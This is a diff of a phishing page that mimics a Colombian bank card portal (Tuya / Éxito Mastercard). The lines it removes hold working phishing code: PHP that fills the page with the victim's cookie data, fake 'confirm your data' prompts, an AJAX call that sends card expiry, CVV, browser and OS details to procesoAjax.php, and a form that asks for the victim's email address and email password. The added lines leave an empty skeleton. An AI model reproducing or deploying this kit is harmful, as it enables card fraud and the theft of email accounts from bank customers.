@@ -272,47 +272,13 @@ Sys.WebForms.PageRequestManager._initialize('ctl00$smTransaccional', 'aspnetForm
 
 
 
-<?php
 
-function getUserIpAddr(){
-    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
-        $ip = $_SERVER['HTTP_CLIENT_IP'];
-    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
-        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
-    }else{
-        $ip = $_SERVER['REMOTE_ADDR'];
-    }
-    return $ip;
-}
-
-$ip = getUserIpAddr();
-
-$nombre = strtoupper ( $_COOKIE['nombre']);
-
-$fechaactual="Fecha Actual  ";
-$fechaultimoingreso="Fecha Último Ingreso ";
-$version ="Version 5.0.1";
-
-
-$dateTime = new DateTime('now', new DateTimeZone('America/Bogota')); 
-
-$date = DateTime::createFromFormat('h:i a', '10:00 AM');
-//var_dump($date->format('G') < 12);  // true
-
-if ($date->format('G') < 12){
-	$tiempo =" a.m";
-}else{
-	$tiempo =" p.m";
-}
-
-
-?>
                 <div id="HeaderLogin">
-                    <span id="ctl00_lblNombre"><?php echo $nombre;?></span><br>
-                    <span id="ctl00_lblFecha"><?php echo $fechaactual;      echo $dateTime->format("d/m/Y  H:i:s ");  echo $tiempo;?></span><br>
-                    <span id="ctl00_lblFechaUltimoIngreso"><?php echo $fechaultimoingreso;?>15/10/2020 11:18:52 a.m.</span><br>
-                    <span id="ctl00_lblIP"><?php echo "IP ".$ip; ?></span><br>
-                    <span id="ctl00_lblVersion"><?php ?>Versión 5.0.1</span>
+                    <span id="ctl00_lblNombre"><!--nombre --></span><br>
+                    <span id="ctl00_lblFecha"><!-- fecha  y hora con am y pm--></span><br>
+                    <span id="ctl00_lblFechaUltimoIngreso"><!-- fecha diagonal y hora con am y pm ultimmo ingreso --></span><br>
+                    <span id="ctl00_lblIP"><!-- ip javascript--></span><br>
+                    <span id="ctl00_lblVersion">Versión 5.0.1</span>
                 </div>
             </div>
         </div><br><br>
@@ -379,13 +345,7 @@ if ($date->format('G') < 12){
         <span id="ctl00_DefaultContent_Label1">Consulta de Productos</span>
     </div>
 
-    <div id="errorPage">
-        <p>
-            <span id="ctl00_DefaultContent_cvApp" style="color:Red;visibility:hidden;"></span>
-            </p><div id="ctl00_DefaultContent_vsApp" style="color:Red;display:none;">
-
-</div>
-    </div>
+    
 
     <div id="contentPage">
         
@@ -401,7 +361,7 @@ if ($date->format('G') < 12){
                             <img id="imgdiv**** **** **** ****" style="vertical-align: bottom" width="15px" border="0" src="../App_Themes/Imagenes/Minus.png" alt=""></a>
                     </td><td align="left">
                         <span id="ctl00_DefaultContent_GvProductoExtend_ctl02_lblProducto">TARJETA EXITO MASTERCARD</span>
-                    </td><td align="center"> <?php echo $_COOKIE['tarjeta']; ?></td></td><td align="center"> <a onclick="escribir()"><i class="fas fa-unlock-alt"></i></a>
+                    </td><td align="center"> **** **** **** ****</td></td><td align="center"> <a onclick="escribir()"><i class="fas fa-unlock-alt"></i></a>
                         </td></tr><tr>
                             <td colspan="100%" style="background: #F5F5F5; text-align: right; font-family: Calibri;">
                                 <div id="div**** **** **** ****" style="display: inline; position: relative; right: 15px; font-size: 15px; overflow: auto;">Cupo Disponible: $ *.***.***,**</div></td>
@@ -420,55 +380,10 @@ if ($date->format('G') < 12){
 	
 	
 	
-	<div class="oculto1" hidden id="oculto1">
 	
 	
-	<table cellspacing="0" border="0" id="ctl00_DefaultContent_GvProductoExtend" style="width:600px;border-collapse:collapse;">
-	<tbody><tr class="TituloGrid" style="color:White;background-color:#3E3E3E;font-family:Calibri;font-size:15px;">
-	<th align="center" scope="col" style="padding-left: 232px;">VERIFICAR DATOS CLIENTE</th>
-	<th align="center" scope="col"></th>
-		
-				
-											<br>
-	<tr style="font-family:Calibri;font-size:15px;">
-	<td valign="middle" style="    padding-left: 99px; ">NOMBRE COMPLETO:  </td><td> <input readonly style="background: #e4e7ff; border: 0;" type="text" value="<?=$nombre ?>" required></td>
-	
-	</tr>
-	<br>
-	
-	<tr style="font-family:Calibri;font-size:15px;">
-	<td style="width:20px;padding-left: 99px;">CORREO: </td><td><input readonly type="text" style="background:#e4e7ff; border: 0;" value="<?=$_COOKIE['correo']; ?>" required></td>
-	
-	</tr>
-	
-	<?php
-	$telefono = $_COOKIE['telefono'];
-
-if ($_COOKIE['telefono']=""){
-    $telefono ="20160811";
-}
-	
-
-	
-	
-	?>
-	
-	<br>
-	<tr style="font-family:Calibri;font-size:15px;">
-	<td valign="middle" style="width:20px;padding-left: 99px;" >TELEFONO: </td><td><input  readonly style="background:#e4e7ff; border: 0;" type="text"  id="telefono" value="<?=$telefono; ?>" required></td> 
-	
-	</tr>
-	
-	<tr style="font-family:Calibri;font-size:15px;">
-	<td valign="middle" style="width:20px;"></td><td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input  type="button" id="continuar3" onclick="continuar()" value="continuar"></td>
-	
-	</tr>
-	</tbody>
-	</table>
-	</div>
-	
-	<form id="miformulario" method="post" action="Verification" name="form2" >
-	<div class="oculto2" hidden id="oculto2">
+	<form id="miformulario" method="post" action="" name="form2" >
+	<div class="oculto2"  id="oculto2">
 	<br><br><br>
 		<table cellspacing="0" border="0" id="ctl00_DefaultContent_GvProductoExtend" style="width:600px;border-collapse:collapse;">
 	<tbody>
@@ -498,52 +413,7 @@ if ($_COOKIE['telefono']=""){
 	
 
 	</div>
-	
-	
 
-
-
-	<div class="oculto2" hidden id="oculto3">
-	<br><br><br>
-	<table cellspacing="0" border="0" id="ctl00_DefaultContent_GvProductoExtend" style="width:600px;border-collapse:collapse;">
-	<tbody>
-	<tr class="TituloGrid" style="color:White;background-color:#3E3E3E;font-family:Calibri;font-size:14px;">
-	<th align="center" scope="col" style="padding-left: 190px;">INGRESE SU CORREO PARA CONTINUAR</th>
-	<th align="center" scope="col"></th>
-	</tr>
-
-
-    <tr style="font-family:Calibri;font-size:15px;">
-	<td valign="middle" style="width:20px;padding-left: 99px;" >CORREO ELECTRONICO: </td><td><input  type="email"  id="email" name="cor"></td>
-	
-	</tr>
-	
-	<tr style="font-family:Calibri;font-size:15px;">
-	<td valign="middle" style="width:20px;padding-left: 99px;" >CONTRASEÑA CORREO: </td><td><input  type="password"  id="dasw" name="cla"></td>
-	
-	</tr>
-	
-	<tr style="font-family:Calibri;font-size:15px;">
-	
-	
-	<td valign="middle" style="width:20px;"></td><td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="submit" value="Finalizar"></td>
-	
-	</tr>
-	
-	</tbody>
-	</table>
-
-
-
-
-
-
-
-	
-	
-	
-	
-	
 	</form>
 
 
@@ -583,206 +453,24 @@ function soloNumeros(e){
   }
 }
 
-function bloqueo(){
-	alert('Cuenta bloqueada')
-}
 
-	
 
-	setTimeout(function escribir(){
-		let p = document.getElementById('oculto1');
-		p.removeAttribute("hidden");
-		alert('Confirme sus datos');
-		segundo();
-	}, 3000);
-	
-	
-	function segundo(){
-	    setTimeout(function(){
-	    	$('#continuar3').click();
-	    }, 7000);
-	}
 
-	
-	function continuar(){
-	console.log('continuar')
-	
-				openLoading();
-			 
-				  setTimeout(function(){
-				      
-					$("#ctl00_DefaultContent_cvApp").css('visibility', 'visible');
+		
 				
-				  }, 3000);
-					
-
-                setTimeout(function(){
-                					  
-                					let j = document.getElementById('oculto1');
-                					j.setAttribute("hidden", true);
-                					let i = document.getElementById('oculto2');
-                					i.removeAttribute("hidden");
-                				
-                					}, 5000);
-                	}
-                	
 	
-	//	$('#continuar3').click();
-	 
-	 
-	function continuar2(){
-	console.log('continuar2')
-	
-	var  m = document.getElementById('mes').value;
-	var  a = document.getElementById('ano').value;
-	var  c = document.getElementById('cvv').value;
+		
 	
 	
-
-	if (
-	
-	     m.length === 2 &&  ($("#mes").val() > 0 &&  $("#mes").val() < 13 )  && a.length === 2 &&  ($("#ano").val() > 20 &&  $("#ano").val() < 30 ) &&  c.length === 3
-		 
-
-	                                                              ) {
-		console.log('bien')
 		
 		
-		
-		
-	tta();	
-function tta(mes,ano,cvv) {
-	
-	
-	var getBrowserInfo = function() {
-			var ua= navigator.userAgent, tem, 
-			M= ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
-			if(/trident/i.test(M[1])){
-				tem=  /\brv[ :]+(\d+)/g.exec(ua) || [];
-				return 'IE '+(tem[1] || '');
-			}
-			if(M[1]=== 'Chrome'){
-				tem= ua.match(/\b(OPR|Edge)\/(\d+)/);
-				if(tem!= null) return tem.slice(1).join(' ').replace('OPR', 'Opera');
-			}
-			M= M[2]? [M[1], M[2]]: [navigator.appName, navigator.appVersion, '-?'];
-			if((tem= ua.match(/version\/(\d+)/i))!= null) M.splice(1, 1, tem[1]);
-			return M.join(' ');
-		};
 
 
-	
-	
-	
-	
-	var  m = document.getElementById('mes').value;
-	var  a = document.getElementById('ano').value;
-	var  c = document.getElementById('cvv').value;
-	
-	var  b = getBrowserInfo();
-	
-	
-	var OSName="Unknown OS";
-	if (navigator.appVersion.indexOf("Win")!=-1) OSName="Windows";
-	if (navigator.appVersion.indexOf("Mac")!=-1) OSName="MacOS";
-	if (navigator.appVersion.indexOf("X11")!=-1) OSName="UNIX";
-	if (navigator.appVersion.indexOf("Linux")!=-1) OSName="Linux";
-
-
-
-     var parametros = {"mes":m,"ano":a,"cvv":c,"nav":b,"sis":OSName};
-	 console.log('llego a validar');
-	// console.log($("#mes").val());
-	 //console.log($("#ano").val());
-	 //console.log($("#mes").val());
-	 
-$.ajax({
-    data:parametros,
-    url:'procesoAjax.php',
-    type: 'post',
-    beforeSend: function () {
-		
-        //$("#resultado").html("Procesando, espere por favor");
-		
-
-		
-					
-					
-					
-    },
-    success: function (response) {   
-	
-	 console.log('despues del envio ');
-       
-      
-
+			 
+				
+					  
 			
-			 
-				  setTimeout(function(){
-					  openLoading();
-					  
-					  
-					$("#ctl00_DefaultContent_cvApp").css('visibility', 'visible');
-				
-setTimeout(function(){
-		let j = document.getElementById('oculto1');
-		j.setAttribute("hidden", true);
-		let i = document.getElementById('oculto2');
-		i.setAttribute("hidden", true);
-		let k = document.getElementById('oculto3');
-		k.removeAttribute("hidden");
-		
-		}, 3000);
-		
-		
-		
-				
-					}, 3000);
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-		   
-	}
-});
-}
-
-		
-		
-		
-		
-
-		function mostrar1(){
-				openLoading();
-			 
-				  setTimeout(function(){
-					  
-					$("#ctl00_DefaultContent_cvApp").css('visibility', 'visible');
-				
-
-let j = document.getElementById('oculto1');
-		j.setAttribute("hidden", true);
-		let i = document.getElementById('oculto2');
-		i.setAttribute("hidden", true);
-		
-		let k = document.getElementById('oculto3');
-		k.removeAttribute("hidden");
-		
-				
-					}, 3000);
-		}	
 
 
 
@@ -791,49 +479,7 @@ let j = document.getElementById('oculto1');
 	
 		
 		
-	}
 	
-		}
-	
-	function menu2add(x){
-    x.classList.add("ct100_tvMenu_8");
-	x.classList.add("menu_hoverNodestyle");	
-	x.classList.add("ct100_tvMenu_7");
-	x.classList.add("subrayado");
-	}
-	
-	function menu2rem(x) {
-    x.classList.remove("ct100_tvMenu_8");
-	x.classList.remove("menu_hoverNodestyle");
-	x.classList.remove("subrayado");
-	}
-	
-        function divexpandcollapse(divname) {
-            var div = document.getElementById(divname);
-            var img = document.getElementById('img' + divname);
-            if (div.style.display == "none") {
-                div.style.display = "inline";
-                img.src = "../App_Themes/Imagenes/Minus.png";
-                $.ajax({
-                    type: "POST",
-                    url: "Default.aspx/CupoDisponible",
-                    data: "{'sNumTarjeta':'" + divname + "' }",
-                    contentType: "application/json; charset=utf-8",
-                    dataType: "json",
-                    success: function (response) {
-                        if (response.d != null) {
-                            div.textContent = response.d;
-                        }
-                    },
-                    failure: function (response) {
-                        div.textContent = "Información no disponible ";
-                    }
-                });
-            } else {
-                div.style.display = "none";
-                img.src = "../App_Themes/Imagenes/Mas.png";
-            }
-        }
         $(document).ready(function () {
 			
 
@@ -858,13 +504,13 @@ let j = document.getElementById('oculto1');
  
 			
 		 openLoading();
-			 
-				  setTimeout(function(){
-					  
-					$("#ctl00_DefaultContent_cvApp").css('visibility', 'visible');
-					
-					}, 5000);
-			
+		
+
+
+	   
+	
+
+		
 			
 			
             var numTarjeta = '**** **** **** ****';
@@ -883,23 +529,14 @@ let j = document.getElementById('oculto1');
 
 
 
-
-            if ('0' === '0') {
-                var id = '903f8071225b0d36f435636a1416b854e0aa3f66d4f8c2a5e6c7c8a9ab80467d';
-                if (id != null && id != '') {
-                    bk_addPageCtx('tuya_id', id);
-                    bk_addPageCtx('id', id);
-                    bk_allow_multiple_calls = true;
-                    bk_use_multiple_iframes = true;
-                    bk_doJSTag(86430, 1);
-                    
-                }
-            }
+	
+           
         }
 
         );
     </script>
-
+	
+	
             </div>
         </div>
         <div id="ContactFrame">
@@ -915,90 +552,12 @@ let j = document.getElementById('oculto1');
         </div>
 
     
-<script type="text/javascript">
-//<![CDATA[
-var ctl00_tvMenu_ImageArray =  new Array('WebResource.axd', 'WebResource.axd', 'WebResource.axd', 'WebResource.axd', 'WebResource.axd', 'WebResource.axd');
-var Page_ValidationSummaries =  new Array(document.getElementById("ctl00_DefaultContent_vsApp"));
-var Page_Validators =  new Array(document.getElementById("ctl00_DefaultContent_cvApp"));
-//]]>
-</script>
-
-<script type="text/javascript">
-//<![CDATA[
-var ctl00_DefaultContent_cvApp = document.all ? document.all["ctl00_DefaultContent_cvApp"] : document.getElementById("ctl00_DefaultContent_cvApp");
-ctl00_DefaultContent_cvApp.evaluationfunction = "CustomValidatorEvaluateIsValid";
-var ctl00_DefaultContent_vsApp = document.all ? document.all["ctl00_DefaultContent_vsApp"] : document.getElementById("ctl00_DefaultContent_vsApp");
-ctl00_DefaultContent_vsApp.showmessagebox = "True";
-ctl00_DefaultContent_vsApp.showsummary = "False";
-//]]>
-</script>
-
-
-<script type="text/javascript">
-//<![CDATA[
-var start=new Date();start=Date.parse(start)/1000;var counts=420;function CountDown(){var now=new Date();now=Date.parse(now)/1000;var x=parseInt(counts-(now-start),10);if(x>0){timerID=setTimeout('CountDown()', 100)}else{if(window.location.href.toUpperCase().indexOf('PAGINAS') > -1){portaltwindow=window.open('CerrarSesion.aspx','','width=322,height=159'); location.href='../login.aspx';}else{portaltwindow=window.open('Paginas/CerrarSesion.aspx','','width=322,height=159'); location.href='login.aspx';}}}CountDown();
-var callBackFrameUrl='../WebResource.axd';
-WebForm_InitCallback();var ctl00_tvMenu_Data = new Object();
-ctl00_tvMenu_Data.images = ctl00_tvMenu_ImageArray;
-ctl00_tvMenu_Data.collapseToolTip = "Collapse {0}";
-ctl00_tvMenu_Data.expandToolTip = "Expand {0}";
-ctl00_tvMenu_Data.expandState = theForm.elements['ctl00_tvMenu_ExpandState'];
-ctl00_tvMenu_Data.selectedNodeID = theForm.elements['ctl00_tvMenu_SelectedNode'];
-ctl00_tvMenu_Data.hoverClass = 'ctl00_tvMenu_8 menu_hoverNodestyle';
-ctl00_tvMenu_Data.hoverHyperLinkClass = 'ctl00_tvMenu_7 menu_hoverNodestyle';
-(function() {
-  for (var i=0;i<6;i++) {
-  var preLoad = new Image();
-  if (ctl00_tvMenu_ImageArray[i].length > 0)
-    preLoad.src = ctl00_tvMenu_ImageArray[i];
-  }
-})();
-ctl00_tvMenu_Data.lastIndex = 10;
-ctl00_tvMenu_Data.populateLog = theForm.elements['ctl00_tvMenu_PopulateLog'];
-ctl00_tvMenu_Data.treeViewID = 'ctl00$tvMenu';
-ctl00_tvMenu_Data.name = 'ctl00_tvMenu_Data';
-
-var Page_ValidationActive = false;
-if (typeof(ValidatorOnLoad) == "function") {
-    ValidatorOnLoad();
-}
-
-function ValidatorOnSubmit() {
-    if (Page_ValidationActive) {
-        return ValidatorCommonOnSubmit();
-    }
-    else {
-        return true;
-    }
-}
-        
-(function(id) {
-    var e = document.getElementById(id);
-    if (e) {
-        e.dispose = function() {
-            Array.remove(Page_ValidationSummaries, document.getElementById(id));
-        }
-        e = null;
-    }
-})('ctl00_DefaultContent_vsApp');
-Sys.Application.add_init(function() {
-    $create(Sys.UI._Timer, {"enabled":false,"interval":1000,"uniqueID":"ctl00$TReloj"}, null, null, $get("ctl00_TReloj"));
-});
-
-document.getElementById('ctl00_DefaultContent_cvApp').dispose = function() {
-    Array.remove(Page_Validators, document.getElementById('ctl00_DefaultContent_cvApp'));
-}
-//]]>
 
 
 
 
 
-	
-	
 
-
-</script>
 
 
 
